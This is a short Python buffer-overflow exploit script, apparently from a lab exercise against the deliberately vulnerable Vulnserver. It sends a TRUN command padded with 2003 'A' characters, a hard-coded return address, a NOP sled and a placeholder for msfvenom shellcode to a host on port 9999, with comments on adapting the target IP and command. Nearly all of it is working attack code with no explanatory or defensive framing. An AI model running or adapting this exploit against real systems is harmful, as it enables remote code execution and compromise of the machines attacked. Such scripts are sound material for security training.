#!/usr/bin/python

import sys, socket

overflow = ("")         # copy over the shell code from msfvenom

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow      # fill memory with 2003 A's, add jump instruction, add nop padding, add shellcode to run 

while True:
    try: 
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('192.168.1.90',9999))                    #change to match the IP and port# of the application you are fuzzing

            s.send(('TRUN /..:/' + shellcode))                     #change TRUN to be the command you are Fuzzing
            s.close()

    except: 
            print("Error connecting to Server.")
            sys.exit()
            